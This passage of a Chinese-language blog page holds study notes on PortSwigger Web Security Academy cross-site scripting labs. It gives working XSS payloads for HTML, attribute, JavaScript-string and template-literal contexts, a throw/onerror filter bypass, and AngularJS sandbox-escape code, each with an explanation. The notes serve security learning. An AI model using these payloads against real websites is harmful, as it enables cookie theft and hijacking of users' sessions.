punctuation">&lt;</span>iframe</span>  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://YOUR-LAB-ID.web-security-academy.net/?search=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onresize</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>"  onload=this.style.width='100px'> </code></pre><p>是一个HTML标签，用于在当前页面中创建一个内联框架，允许嵌入另一个网页。<code>src="[https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E]</code>(https://YOUR-LAB-ID.web-security-academy.net/?search="&gt;)"是iframe标签的src属性，指定要在内联框架中加载的页面的URL。URL包括一个搜索查询参数（search），值为"&gt;后跟<code>&lt;body onresize=print()&gt;</code>。这是一个URL编码的字符串，表示要注入到易受攻击的网站搜索字段中的HTML代码。%22：这是双引号（"）字符的URL编码表示。</p><p>%3E：这是大于号（&gt;）字符的URL编码表示。</p><p>%3C：这是小于号（&lt;）字符的URL编码表示。</p><p>%20：这是空格字符的URL编码表示。</p><p>onresize=print()：这是附加到注入HTML代码的body标签的事件属性。它指定当触发onresize事件（例如当浏览器窗口大小调整）时，应执行print（）函数。print（）函数打开浏览器的打印对话框，可用于各种目的，如钓鱼或分散注意力的技术。</p><p>onload=this.style.width='100px'：这是附加到iframe标签本身的另一个事件属性。它指定当触发onload事件（例如当iframe加载完成）时，iframe的宽度CSS属性应设置为100px。这是为了使注入的body标签不太明显，因为它会被缩小到一个非常小的大小。</p></li></ol></li><li><p><strong>Lab: Reflected XSS into HTML context with all tagsblocked except custom ones</strong></p><ol type="1"><li><p>先理解题目，同上注入payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>location <span class="token operator">=</span> <span class="token string">'https://YOUR-LAB-ID.web-security-academy.net/?search=&lt;xss id=x onfocus=alert(document.cookie) tabindex=1>#x'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>解析：这段代码是一个 JavaScript 脚本，它将浏览器重定向到一个URL。在这个 URL 中，有一个包含 XSS 攻击负载的查询字符串参数search。这个查询字符串参数包含一个自定义标签 <code>&lt;xss id=x</code><code>onfocus=alert(document.cookie) tabindex=1&gt;</code>，其中 id属性的值为 x，onfocus 事件处理程序的值是一个弹出文档 cookie 的JavaScript 脚本。最后的 #x 是一个 URL锚点，它指定了在加载页面时要聚焦的元素的 ID，即这里的 x元素。因此，当页面加载时，x 元素获得焦点，onfocus 事件被触发，导致JavaScript 弹出文档 cookie 的值。整个代码的目的是演示如何利用 XSS漏洞来窃取用户的敏感信息。</p></li></ol></li></ul><p>​ <strong>疑问：</strong> 使用 exploit server 存储和传递XSSPayload给受害者浏览器</p><ul><li><p><strong>Lab: Reflected XSS with event handlers and<code>href</code> attributes blocked</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">YOUR</span><span class="token operator">-</span><span class="token constant">LAB</span><span class="token operator">-</span><span class="token constant">ID</span><span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>a<span class="token operator">></span><span class="token operator">&lt;</span>animate attributeName<span class="token operator">=</span>href values<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>text x<span class="token operator">=</span><span class="token number">20</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token operator">></span>Click me<span class="token operator">&lt;</span><span class="token operator">/</span>text<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span> </code></pre><ul><li>https://YOUR-LAB-ID.web-security-academy.net/：这是一个 URL，其中YOUR-LAB-ID 是实验室的 ID，它用于访问 Web安全学院的网络安全实验室。</li><li>?search=：这是一个查询参数，用于将搜索词传递给 Web 应用程序。在此URL 中，它的值为<code>&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=javascript:alert(1) /&gt;&lt;text x=20 y=20&gt;Click me&lt;/text&gt;&lt;/a&gt;</code>，这是一个包含SVG 元素和 JavaScript 代码的字符串。</li><li><code>&lt;svg&gt;</code>：这是 SVG（Scalable VectorGraphics）元素，用于定义矢量图形。</li><li><code>&lt;a&gt;</code>：这是超链接元素，用于在文档中创建链接。</li><li><code>&lt;animate&gt;</code>：这是 SVG 动画元素，用于为 SVG元素添加动画效果。</li><li>attributeName=href：这是 animate元素的属性之一，指定要在动画期间更改的属性。在此 URL 中，href属性是目标。</li><li>values=javascript:alert(1)：这是 animate元素的属性之一，指定在动画期间要更改目标属性的值。在此 URL中，它包含一个 JavaScript 弹出窗口警告框，显示数字 1。</li><li><code>&lt;text&gt;</code>：这是 SVG 文本元素，用于在 SVG中添加文本。</li><li>x=20 y=20：这些是 text 元素的属性之一，指定文本在 SVG中的位置。</li><li>Click me：这是 text 元素中包含的文本。</li></ul></li><li><p><strong>Lab: Reflected XSS with some SVG markupallowed</strong></p><ol type="1"><li><p>burp-intruder,检测未被屏蔽的tag和event</p></li><li><p>最终payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>0a3d009d038e2c338158e8e4009f00e6<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span>search<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li></ol></li><li><p><strong>XSS in HTML tag attributes</strong></p><ol type="1"><li><strong>示例1：</strong>假设存在以下HTML代码：</li></ol><pre class="language-markup" data-language="markup"><code class="language-markup">graphql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>在这个情况下，我们想要在value属性中插入一个XSSpayload，来触发一个弹窗。</p><p>我们可以试图在value属性中插入一个完整的script标签，但是由于双引号的存在，我们无法将整个标签放入value属性中。</p><p>但是，我们可以在双引号后面插入一个空格，从而“终止”value属性，然后添加一个新的属性，用于触发XSSpayload。如下所示：</p><pre class="language-markup" data-language="markup"><code class="language-markup">php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>这将使得HTML标签变成如下的形式：</p><pre class="language-markup" data-language="markup"><code class="language-markup">php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>这样一来，我们就成功地将XSS payload插入到HTML标签的属性中，达到了攻击的目的。当用户访问这个页面并点击搜索框时，将会触发这个XSSpayload，弹出一个提示框，显示当前</p><ol start="2" type="1"><li><p><strong>示例2</strong>：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">" autofocus onfocus=alert(document.domain) x="</span></code></pre></li></ol></li><li><p><strong>Lab: Stored XSS into anchor <code>href</code> attributewith double quotes HTML-encoded</strong></p><ol type="1"><li>href 属性的利用：注入 <code>javascript:alert(1)</code><imgsrc="https://s2.loli.net/2023/04/09/xHsLoVQD8tu62SB.png"alt="image-20230409152554775" /></li></ol></li><li><p><strong>Lab: Reflected XSS in canonical link tag</strong></p><ul><li><p>payload:<strong>组合键</strong>触发JS</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>0ad9009804850975818a2f6e000f002c<span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span><span class="token operator">?</span><span class="token string">'accesskey='</span>x<span class="token string">'onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p><strong>Lab: Reflected XSS into a JavaScript string with singlequote and backslash escaped</strong></p><ul><li><p>因为输入含有单引号的字符串，单引号会被转义，所以判断这个输入框是被JS解析的</p></li><li><p>因此构造payload 提前结束JS，并在后面添加自己的JS,Payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li></ul></li><li><p><strong>Reflected XSS into a JavaScript string with anglebrackets HTML encoded</strong></p><p>这题像经典的sql注入</p><ol type="1"><li><p>首先可以在搜索框加入引号闭合字符串试探</p></li><li><p>最后使用这个payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'-alert(1)-'</span></code></pre><hr /><p><strong>横杠</strong><code>-</code>的解释：</p><p>在某些情况下，需要使用横杠来打破字符串的闭合，从而能够注入其他代码，例如在某些字符串拼接的场景中。这是因为如果不使用横杠，输入的有效载荷可能会被视为字符串的一部分而不是注入代码。例如，假设我们要在以下字符串中注入有效载荷：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">csharpCopy code<span class="token keyword">var</span> search <span class="token operator">=</span> <span class="token string">'search string: '</span> <span class="token operator">+</span> user_input<span class="token punctuation">;</span></code></pre><p>如果直接将有效载荷 <code>alert(1)</code> 放在 <code>user_input</code>变量中，则字符串将变成：</p><pre class="language-none"><code class="language-none">csharpCopy codevar search &#x3D; &#39;search string: alert(1)&#39;;</code></pre><p>在这种情况下，注入的有效载荷将被视为字符串的一部分，而不是要执行的JavaScript代码。为了打破字符串的闭合，我们可以使用横杠将有效载荷包装起来，例如：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">csharpCopy code<span class="token keyword">var</span> search <span class="token operator">=</span> <span class="token string">'search string: '</span> <span class="token operator">+</span> <span class="token string">'-alert(1)-'</span><span class="token punctuation">;</span></code></pre><p>这将打破了字符串的闭合，注入的有效载荷现在可以作为JavaScript代码执行。</p><p>然而，并非所有情况都需要使用横杠。例如，当注入点不在字符串拼接的位置时，横杠可能不是必需的。在这种情况下，注入的有效载荷可以直接放置在JavaScript代码中。因此，在注入有效载荷时，需要根据上下文进行判断是否需要使用横杠。</p><hr /><p><strong>观察响应</strong>，每次引号闭合都有 <code>;</code>结束<imgsrc="https://s2.loli.net/2023/04/10/OX8bRh19stvnTfQ.png"alt="image-20230410023540225" /></p></li></ol></li><li><p><strong>Lab: Reflected XSS into a JavaScript string with anglebrackets and double quotes HTML-encoded and single quotesescaped</strong></p><p>原理：引号会被添加反斜杠解析成纯字符，而不是jS中的字符串结束符号，而在payload中的引号前手动加上,那么引号就不会被解析成纯文本。</p><ol type="1"><li><p>使用 <code>abcd'1234</code>,观察</p></li><li><p>最终payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">\<span class="token string">'alert('</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token comment">//</span></code></pre></li></ol></li><li><p><strong>Reflected XSS in a JavaScript URL with some charactersblocked</strong></p><p><ahref="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSSwithout parentheses and semi-colons</a></p><ol type="1"><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">YOUR</span><span class="token operator">-</span><span class="token constant">LAB</span><span class="token operator">-</span><span class="token constant">ID</span><span class="token punctuation">.</span>web<span class="token operator">-</span>security<span class="token operator">-</span>academy<span class="token punctuation">.</span>net<span class="token operator">/</span>post<span class="token operator">?</span>postId<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>x<span class="token operator">=</span>x<span class="token operator">=</span><span class="token operator">%</span>3E<span class="token punctuation">&#123;</span><span class="token keyword">throw</span><span class="token comment">/**/</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token number">1337</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>toString<span class="token operator">=</span>x<span class="token punctuation">,</span>window<span class="token operator">%</span>2b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token operator">%</span><span class="token number">27</span></code></pre><p><strong>解析：</strong></p><p>这个攻击利用了异常处理的机制，通过 throw语句触发异常，然后在异常处理函数中调用 alert函数，并传入参数。利用了箭头函数创建一个代码块，以便使用 throw语句。为了调用这个函数，我们需要将它分配给 window 对象的 toString属性，并通过强制将 window 对象转换为字符串来触发它。这个攻击会成功，但是alert 只有在点击页面底部的“返回博客”后才会触发。</p><ol type="1"><li><code>postId=5&amp;%27&#125;</code>：将postId设置为5，这是URL中的有效查询参数。</li><li><code>,x=x=%3E&#123;throw/**/onerror=alert,1337&#125;</code>：这里使用了一个箭头函数<code>x=x=&gt;&#123;&#125;</code>，并通过throw语句来抛出异常。throw语句会在执行时立即停止函数的运行，并把控制权交给其父级调用函数。在这种情况下，它会触发一个异常并将其传递给onerror处理程序。通过在throw语句中使用一个注释，它可以避免不允许在URL中使用空格的限制。</li><li><code>,toString=x</code>：使用toString()方法将x函数转换为字符串。</li><li><code>,window%2b%27%27</code>：将window对象强制转换为字符串。</li><li><code>&#123;x:%27</code>：创建一个名为x的对象，然后将其设置为一个字符串。</li></ol></li></ol></li><li><p><strong>lab:Stored XSS into <code>onclick</code> event with anglebrackets and double quotes HTML-encoded and single quotes and backslashescaped</strong></p><p><strong>html实体编码</strong></p><ol type="1"><li><p>评论试探：website输入框会被反射</p></li><li><p>payload:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>foo<span class="token operator">?</span><span class="token operator">&amp;</span>apos<span class="token punctuation">;</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&amp;</span>apos<span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/04/17/G2ICxEhZt81jofU.png"alt="image-20230417124325986" /><figcaption aria-hidden="true">image-20230417124325986</figcaption></figure></li><li><p>注意在Burp中关键词url编码</p></li></ol></li><li><p><strong>Lab: Reflected XSS into a template literal with anglebrackets, single, double quotes, backslash and backticksUnicode-escaped</strong></p><p><strong>JavaScript模板字符串</strong>是一种字符串字面量，它允许嵌入JavaScript表达式。嵌入的表达式将被计算并且通常会被连接到周围的文本中。模板字符串用反引号而不是常规引号括起来，并且使用${...}语法来标识嵌入的表达式。<strong>不需要</strong>使用闭合标签，因为模板字符串本身已经提供了一个安全的JavaScript执行环境。</p><p>例如，以下脚本将打印一个包含用户显示名称的欢迎消息：注意<strong>反引号</strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Welcome, </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token punctuation">.</span>displayName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code></pre><ol type="1"><li><p>payload试探：反引号说明使用了JS模板字符串<imgsrc="https://s2.loli.net/2023/04/17/ogEdr9Z4YmxVz7G.png"alt="image-20230417144538422" /></p></li><li><p>最终payload</p><pre class="language-JS" data-language="JS"><code class="language-JS">$&#123;alert(1)&#125;</code></pre></li></ol></li></ul><h4 id="client-side-template-injection-1">Client-side templateinjection</h4><ul><li><p><a href="http://jsfiddle.net/2zs2yv7o/1/">资源网站</a><imgsrc="https://s2.loli.net/2023/04/17/eOPlALfSkbQpu4n.png"alt="image-20230417151700777" /></p></li><li><p><strong>XSS without HTML: Client-Side Template Injection withAngularJS</strong></p><p><code>Angular模板</code>可以包含表达式——双大括号内的类似于JavaScript的代码片段。以下jsfiddle展示了它们的工作原理：</p><p>文本输入2会由Angular计算，然后显示输出：2。</p><ol type="1"><li><p>以下两个片段展示了漏洞的本质。第一个页面动态嵌入用户输入，但不会受到XSS的影响，因为它使用htmlspecialchars来对输入进行HTML编码：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php$q = $_GET['q'];echo htmlspecialchars($q,ENT_QUOTES);?></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>第二个页面几乎相同，但是使用了Angular导入，这意味着它可以被注入Angular表达式，并且通过沙盒逃逸可以进行XSS攻击：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>    <span class="token prolog">&lt;?php$q = $_GET['q'];echo htmlspecialchars($q,ENT_QUOTES);?></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>请注意，在DOM树中，你需要将"ng-app"放在表达式上面。通常，一个Angular站点会将其放在根HTML或body标签中。</p><p>换句话说，如果一个页面是Angular模板，我们将更容易进行XSS攻击。只有一个限制——沙盒。</p><p><strong>sandbox</strong>:</p><p>在计算机安全领域，sandbox（沙箱）是一种<strong>隔离机制</strong>，可以在不影响主机环境的情况下运行不受信任的程序或代码。沙箱通常用于执行不信任的代码，以防止恶意代码对系统的破坏或窃取敏感信息。</p><p>在Web开发中，sandbox通常是指<strong>浏览器的沙箱机制</strong>。浏览器沙箱将JavaScript代码限制在其运行的环境中，以防止它们访问本地文件系统、网络或其他敏感资源。此外，浏览器沙箱还可以限制脚本运行的权限和资源消耗，以保护用户不受恶意代码攻击的影响。</p><p>在AngularJS中，<strong>$sce服务提供了一个沙箱机制</strong>，可以在执行表达式之前将表达式的值进行安全检查和限制，从而保护应用程序免受XSS攻击的威胁。</p><p><spanclass="math inline">\(sce服务提供了一组安全检查函数，例如`\)</span>sce.parseAsHtml<code>和</code>$sce.parseAsUrl`，它们可以用于解析和转义表达式的值，以确保它们不会包含任何不安全的内容。</p><p>在AngularJS中，<code>$sce</code>是一个服务，它提供了一种安全的方式来在应用程序中使用HTML、CSS和URL。</p><p><code>$sce</code>代表"Strict ContextualEscaping"（严格上下文转义），其目的是确保当AngularJS应用程序渲染动态内容时，这些内容不会包含任何恶意代码或脚本，以避免跨站脚本攻击（XSS）。$sce服务提供了三个方法：trustAs()、getTrusted()和parseAs()，用于将动态数据标记为安全内容并在应用程序中使用。</p><p>trustAs()方法用于标记动态数据作为可信任内容，并返回一个被标记的对象。例如，通过$sce.trustAsHtml()方法可以将HTML字符串标记为可信任的HTML内容。getTrusted()方法用于获取被标记为可信任内容的对象的原始值。parseAs()方法用于将一个字符串解析为指定类型的可信任值，例如，将URL字符串解析为可信任的URL值。</p><p>AngularJS 中的 <code>ensureSafeMemberName</code> 和<code>ensureSafeFunction</code>函数都是用来保证表达式求值的安全性，防止恶意代码注入的一种重要机制。下面分别解释这两个函数的原理：</p><ul><li><code>ensureSafeMemberName</code>函数的作用是检查表达式中的属性名称是否合法，防止通过构造出非法的属性名称来执行恶意操作。在检查过程中，该函数会使用正则表达式匹配合法的属性名称，同时也会检查是否包含JavaScript 对象的原型属性，如<code>__proto__</code>、<code>__defineGetter__</code>等，防止通过修改原型链来攻击。</li><li><code>ensureSafeFunction</code>函数的作用是检查函数调用是否安全，防止恶意代码注入。在检查过程中，该函数会检查调用函数的构造函数是否为<code>Function</code>，如果是则说明在调用该函数时使用了 <code>new</code>操作符，如果不是则说明调用的函数本身就是一个安全的函数。另外，该函数还会检查函数调用的方式是否为<code>call</code>、<code>apply</code> 或 <code>bind</code>方法调用，因为这些方法可以将函数的 <code>this</code>上下文绑定到非安全的对象上，导致安全问题。如果检查通过，则返回安全的函数对象；否则，抛出错误信息。</li></ul></li><li><p><strong>ng-bind-html</strong> 是 AngularJS框架中的一个指令，它用于将 HTML内容绑定到元素上。通过使用这个指令，可以将一个包含 HTML代码的字符串绑定到元素上，从而将这些 HTML 代码渲染为 DOM元素，并将其插入到文档中。</p><p>例如，可以在一个 div 元素上使用 ng-bind-html 指令，将一个包含 HTML代码的字符串绑定到该元素上：</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-bind-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>htmlContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>在这个例子中，htmlContent 是一个包含 HTML 代码的字符串，它会被渲染为DOM 元素，并插入到 div 元素中。需要注意的是，由于安全原因，AngularJS会自动将 HTML 代码中的某些元素和属性过滤掉，以避免 XSS攻击。如果想要允许某些元素或属性，则需要使用 $sce服务来进行白名单配置。</p><p><strong>DOM (Document Object Model) 树</strong>指的是浏览器在解析HTML 文档时所生成的一棵树状结构。在这个结构中，每个 HTML标签都是一个节点，节点之间存在着父子关系，例如一个<code>&lt;body&gt;</code> 标签是 <code>&lt;html&gt;</code>标签的子节点，它本身也可以拥有子节点，比如 <code>&lt;p&gt;</code>标签、<code>&lt;h1&gt;</code> 标签等。整个 HTML文档可以被表示成一棵树，这个树状结构中的每个节点都可以被访问和操作。</p><p>通过操作 DOM 树，开发人员可以在浏览器中动态地改变 HTML页面的内容，例如添加、修改或删除元素、修改元素属性、以及添加或移除事件监听器等。这种操作使得Web 开发变得更加灵活和动态，能够实现更多的功能。</p><hr /></li></ol></li></ul><p>​<strong>注：</strong>当我学到这的时候，我觉得很有必要认真学习web、学习JS</p><ul><li><p><strong>Corrupting the sanitizer</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>    &#123;&#123;    'a'.constructor.fromCharCode=[].join;    'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';    &#125;&#125;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><strong>解析：</strong></p><p>这段代码是一个简单的 HTML 页面，其中包含了 AngularJS库。在页面中，通过 Angular 表达式进行了一些操作，以尝试修改<code>String.fromCharCode</code> 函数的行为。</p><p>在 Angular 表达式中，将 <code>String.fromCharCode</code>函数重新定义为一个空数组的 <code>join</code> 方法。然后，将<code>String</code> 构造函数的索引为 0 的属性值设置为<code>&lt;iframe onload=alert(/Backdoored/)&gt;</code>，即一个带有恶意代码的iframe 元素。</p><p>接着，在页面的 <code>&lt;script&gt;</code>标签中，当页面加载完成时，调用了 <code>String.fromCharCode(97)</code>函数，并将其结果使用 <code>document.write</code> 方法输出到页面上。</p><p>由于在 Angular 表达式中修改了 <code>String.fromCharCode</code>函数的行为，所以无论实际传入的参数是什么，最终都会输出<code>&lt;iframe onload=alert(/Backdoored/)&gt;</code>。这就演示了如何通过这种方式在Angular 环境中实现一个后门攻击。</p></li><li><p>Code</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation 